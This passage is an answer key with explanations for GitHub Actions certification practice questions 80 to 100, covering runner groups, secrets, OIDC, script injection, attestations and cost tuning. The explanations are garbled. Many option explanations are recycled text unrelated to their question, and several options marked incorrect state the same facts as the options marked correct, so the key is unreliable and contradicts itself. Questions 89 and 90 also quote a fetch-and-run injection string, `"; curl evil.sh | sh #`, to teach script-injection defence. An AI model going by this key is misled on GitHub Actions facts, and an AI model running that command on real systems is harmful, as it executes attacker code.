- **E:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.
- **F:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 80 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). `GET /orgs/{org}/actions/runner-groups` (`and /enterprises/{enterprise}/actions/runner-groups`) lists configured Runner Groups, repository/workflow visibility settings, and assigned runners. [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 81 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Under `$RUNNER_TOOL_CACHE`, `@actions/tool-cache` expects `<ToolName>/<SemVer>/<arch>/` (`node/20.18.0/arm64/`) paired with sibling marker file `<ToolName>/<SemVer>/<arch>.complete` (`node/20.18.0/arm64.complete`). [Skill 4.7: Customize, preconfigure, and maintain runner images and software dependencies | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/using-github-hosted-runners/customizing-github-hosted-runners)]

- **A:** Correct. Official `actions/setup-*` actions check `$RUNNER_TOOL_CACHE` on hosted/self-hosted runners before downloading, avoiding slow `apt-get` builds on every run.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 82 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). GitHub Actions requires runner agents to update within `30 days` of a new runner release (`or immediately for critical security updates`); outdated runners that fail to update are refused job assignments until upgraded. [Skill 4.7: Customize, preconfigure, and maintain runner images and software dependencies | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/using-github-hosted-runners/customizing-github-hosted-runners)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Correct. Official `actions/setup-*` actions check `$RUNNER_TOOL_CACHE` on hosted/self-hosted runners before downloading, avoiding slow `apt-get` builds on every run.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 83 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Each individual GitHub Actions encrypted secret (`and individual configuration variable`) is capped at `48 KB` (`49,152 bytes`); larger non-secret configs belong in versioned repo files, while large encrypted bundles should be fetched dynamically via OIDC from cloud object/secret stores. [Skill 4.8: Define scope, precedence, and access controls for encrypted secrets and configuration variables at enterprise, organization, repository, and environment levels | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Correct. Both `secrets.*` and `vars.*` resolve by specificity (`Environment` overrides `Repository`, which overrides `Organization`), and Org secrets should scope to `Selected repositories`.

### Question 84 — `A, C` (Manage GitHub Actions for the enterprise)

Correct answers: A and C (are correct). By default, `secrets.*` are NOT passed to workflows triggered by `pull_request` from external forks (`preventing secret theft`), AND inside trusted runs `Environment` secrets/variables override identically named `Repository` and `Organization` entries (`Environment > Repository > Organization`). [Skill 4.8: Define scope, precedence, and access controls for encrypted secrets and configuration variables at enterprise, organization, repository, and environment levels | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)]

- **A:** Correct. Both `secrets.*` and `vars.*` resolve by specificity (`Environment` overrides `Repository`, which overrides `Organization`), and Org secrets should scope to `Selected repositories`.
- **B:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **C:** Correct. Environment secrets take highest precedence (`gated by reviewers/branches`), REST updates require LibSodium sealed boxes, and `vars.*` keeps non-secret config readable.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **E:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **F:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 85 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). Minting an App token (`organization_actions_secrets: write`), `GET`ting `/orgs/{org}/actions/secrets/public-key` (`key_id`, `key`), encrypting client-side via LibSodium `crypto_box_seal`, and `PUT`ting `/orgs/{org}/actions/secrets/{name}` (`selected` repos) rotates secrets cleanly. [Skill 4.9: Manage secrets programmatically and in workflows using the GitHub REST API and secure handling practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/rest/actions/secrets)]

- **A:** Incorrect. Plain base64 without LibSodium fails decryption, `variables` is plaintext, `all` exposes secrets to public repos, and `GET` never returns plaintext.
- **B:** Correct. Actions Secrets REST API requires client-side LibSodium sealed-box encryption against the org public key before `PUT`ting `encrypted_value`.
- **C:** Incorrect. `GITHUB_*` names and `>48 KB` payloads fail validation, and `Environment > Repository > Organization` means Env secrets win.
- **D:** Incorrect. GitHub only decrypts asymmetric LibSodium sealed boxes encrypted with the `key` matching `key_id` from `/public-key`.

### Question 86 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). When `"visibility": "selected"` is specified on `PUT /orgs/{org}/actions/secrets/{secret_name}`, `"selected_repository_ids"` takes an array of integer repository IDs (`manageable afterward via PUT/DELETE .../secrets/{secret_name}/repositories/{repository_id}`). [Skill 4.9: Manage secrets programmatically and in workflows using the GitHub REST API and secure handling practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/rest/actions/secrets)]

- **A:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **B:** Correct. The Actions Secrets REST API accepts only client-side LibSodium sealed-box `encrypted_value` + `key_id`, whereas `/actions/variables` manages plain-text config strings.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 87 — `A` (Secure and optimize automation)

Correct answer: A (is correct). Custom deployment protection rules emit the `deployment_protection_rule` webhook event (`action: requested`), and the GitHub App approves or rejects the gate via `POST /repos/{owner}/{repo}/actions/runs/{run_id}/deployment_protection_rule`. [Skill 5.1: Configure deployment environments, protection rules, required reviewers, and vet Marketplace actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)]

- **A:** Correct. Deployment Environments hold production secrets/OIDC until human and webhook gates pass, and `Verified creator` badges indicate partner identity (`still audit source & pin 40-char SHA!`).
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.

### Question 88 — `D` (Secure and optimize automation)

Correct answer: D (is correct). No — `Protected branches only` restricts deployments strictly to branches governed by branch protection rules (`or active branch rulesets`), blocking unguarded feature branches before any environment secrets or OIDC tokens are issued. [Skill 5.1: Configure deployment environments, protection rules, required reviewers, and vet Marketplace actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Deployment Environments hold production secrets/OIDC until human and webhook gates pass, and `Verified creator` badges indicate partner identity (`still audit source & pin 40-char SHA!`).

### Question 89 — `A` (Secure and optimize automation)

Correct answer: A (is correct). No — `${{ ... }}` is substituted before shell parsing, so a PR title containing `$(curl ...)` or `" ; ...` executes arbitrary shell commands; pass `PR_TITLE: ${{ github.event.pull_request.title }}` in step `env:` and reference `"$PR_TITLE"` (`or read $GITHUB_EVENT_PATH in Python`). [Skill 5.2: Identify and mitigate untrusted input and script injection risks in workflows and actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)]

- **A:** Correct. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **B:** Incorrect. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.
- **C:** Incorrect. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.
- **D:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `${{ ... }}` is substituted before shell parsing, so a PR title containing `$(curl ...)` or `" ; ...` executes arbitrary shell commands; pass `PR_TITLE: ${{ github.event.pull_request.title }}` in step `env:` and reference `"$PR_TITLE"` (`or read $GITHUB_EVENT_PATH in Python`).

### Question 90 — `B, C` (Secure and optimize automation)

Correct answers: B and C (are correct). Never interpolate `${{ inputs.release-notes }}` directly into a Composite action's `run:` script; bind `INPUT_NOTES: ${{ inputs.release-notes }}` inside the step's `env:` block and reference `"$INPUT_NOTES"` (`with explicit shell: bash`), or parse `process.env.INPUT_NOTES` inside Node/Python without a shell. [Skill 5.2: Identify and mitigate untrusted input and script injection risks in workflows and actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.
- **C:** Correct. Binding untrusted event fields to `env:` variables stops shell command injection, and avoiding fork checkouts in `pull_request_target` prevents secret exfiltration.
- **D:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **E:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **F:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.

### Question 91 — `A` (Secure and optimize automation)

Correct answer: A (is correct). Setting `persist-credentials: false` on `actions/checkout@v4` removes the auth header from `.git/config` immediately after cloning so subsequent third-party build plugins/scripts cannot read `GITHUB_TOKEN` from disk. [Skill 5.3: Apply least-privilege permissions to GITHUB_TOKEN and manage cross-repository authentication tokens | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)]

- **A:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.
- **B:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 92 — `D` (Secure and optimize automation)

Correct answer: D (is correct). During its `post:` cleanup hook, `actions/create-github-app-token` calls `DELETE /installation/token` to revoke the installation token immediately upon job completion (`even before its 1-hour TTL expires`). [Skill 5.3: Apply least-privilege permissions to GITHUB_TOKEN and manage cross-repository authentication tokens | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.

### Question 93 — `A` (Secure and optimize automation)

Correct answer: A (is correct). Binding the IAM OIDC condition to exact `StringEquals` `"token.actions.githubusercontent.com:sub": "repo:solsticecloud/cdn-edge:environment:global-prod"` (`plus StringEquals aud: sts.amazonaws.com`) blocks sibling repos and unapproved feature branches from assuming the role. [Skill 5.4: Configure OpenID Connect (OIDC) for federated authentication to cloud providers and external vaults | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)]

- **A:** Correct. OIDC mints short-lived per-job JWTs; cloud trust policies must pin `sub` (`e.g., repo:org/app:environment:production`) and `aud` so other repos or feature branches cannot assume roles.
- **B:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 94 — `B` (Secure and optimize automation)

Correct answer: B (is correct). Gating `production` Environment (`reviewers`, `main`), pinning cloud OIDC `aud` & `sub: repo:<o>/<r>:environment:production`, setting `environment: production` + `id-token: write`, and exchanging short-lived JWTs at runtime eliminates static IAM keys. [Skill 5.4: Configure OpenID Connect (OIDC) for federated authentication to cloud providers and external vaults | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)]

- **A:** Incorrect. Wildcard `repo:*:*` lets external repos assume your cloud role, and omitting `id-token: write` or `environment:` breaks OIDC gating.
- **B:** Correct. Pairing `environment: production` with `id-token: write` gates job execution and emits the `repo:<org>/<repo>:environment:production` `sub` claim.
- **C:** Incorrect. GitHub withholds Environment tokens until protection gates pass, and `pull_request_target` + fork checkout leaks credentials.
- **D:** Incorrect. OIDC JWTs expire in minutes and are minted dynamically per job run, never stored statically.

### Question 95 — `D` (Secure and optimize automation)

Correct answer: D (is correct). Granting `id-token: write` & `attestations: write` in reusable CI, building the immutable `sha256:` image digest, signing provenance via `actions/attest-build-provenance`, and verifying via `gh attestation verify -R <o>/<r> --signer-workflow` secures the container supply chain. [Skill 5.5: Enforce action pinning, supply-chain security controls, and artifact attestations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds)]

- **A:** Incorrect. Sigstore certificates in Artifact Attestations cryptographically bind artifacts to a verifiable GitHub Actions workflow run.
- **B:** Incorrect. `gh attestation verify` requires `-R <org>/<repo>` (or `--owner` + `--signer-workflow`) to validate the exact trusted repository/workflow signer.
- **C:** Incorrect. Attestation signing requires `id-token: write` + `attestations: write`, container attestations require `sha256:` digests, and deploy gates must verify.
- **D:** Correct. SLSA Build Level 3 pairs `id-token: write` + `attestations: write` in a trusted reusable workflow with `gh attestation verify` deploy gating.

### Question 96 — `B, F` (Secure and optimize automation)

Correct answers: B and F (are correct). `actions/attest-build-provenance` and `actions/attest-sbom` (`consolidated under actions/attest`) use short-lived OIDC-bound Sigstore X.509 certificates (`Fulcio` — zero developer-managed private PGP keys!), and `gh attestation verify` validates both the cryptographic signature AND signer workflow claims (`--signer-workflow`). [Skill 5.5: Enforce action pinning, supply-chain security controls, and artifact attestations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. Full 40-character SHA pinning + Immutable Actions prevent upstream tag hijacking, while Sigstore-backed Artifact Attestations prove cryptographic build provenance at deploy time.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **E:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **F:** Correct. OIDC eliminates static cloud keys while `actions/attest-build-provenance` + `gh attestation verify` enforce cryptographic supply-chain provenance.

### Question 97 — `D` (Secure and optimize automation)

Correct answer: D (is correct). Without `${{ runner.os }}` and `${{ runner.arch }}` in the cache `key` (`and restore-keys` prefix!), an `ARM64` job can restore incompatible `X64` ELF object files (`or macOS Mach-O binaries`), causing immediate linker `Exec format error` failures. [Skill 5.6: Optimize workflow execution time and storage using caching, artifact policies, and selective execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/permissions#get-artifact-and-log-retention-settings-for-an-organization)]

- **A:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Correct. Right-sizing `retention-days` (`e.g., 5–14d instead of 90d default`) and configuring `/orgs/{org}/actions/permissions/artifact-and-log-retention` slashes metered GB-month storage.

### Question 98 — `B` (Secure and optimize automation)

Correct answer: B (is correct). Yes — `actions/upload-artifact@v4` supports per-artifact `retention-days` overrides (`from 1 day up to the repository/organization/enterprise retention ceiling`), optimizing metered storage per artifact class. [Skill 5.6: Optimize workflow execution time and storage using caching, artifact policies, and selective execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/permissions#get-artifact-and-log-retention-settings-for-an-organization)]

- **A:** Incorrect. Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.
- **B:** Correct. Every trigger, context, permission, runner, and security boundary in the proposed solution aligns with official GitHub Actions behavior.
- **C:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **D:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.

### Question 99 — `A` (Secure and optimize automation)

Correct answer: A (is correct). Place a fast 45-second `lint-and-typecheck` gate job upstream and declare `needs: lint-and-typecheck` on the 20-leg `matrix` job so syntax or lint errors fail fast before 20 runner VMs ever spin up. [Skill 5.7: Reduce runner cost and resource consumption using concurrency controls, runner sizing, and matrix optimization | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs)]

- **A:** Correct. Canceling superseded PR runs, skipping doc-only pushes, avoiding 10x macOS runners for Linux workloads, and capping `timeout-minutes` eliminate wasted billable minutes.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.

### Question 100 — `D` (Secure and optimize automation)

Correct answer: D (is correct). Adding `ready_for_review` to `on: pull_request: types: [opened, synchronize, reopened, ready_for_review]` combined with `if: github.event.pull_request.draft == false` avoids billing heavy matrix jobs on draft PRs while running immediately when marked ready. [Skill 5.7: Reduce runner cost and resource consumption using concurrency controls, runner sizing, and matrix optimization | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. Canceling superseded PR runs, skipping doc-only pushes, avoiding 10x macOS runners for Linux workloads, and capping `timeout-minutes` eliminate wasted billable minutes.
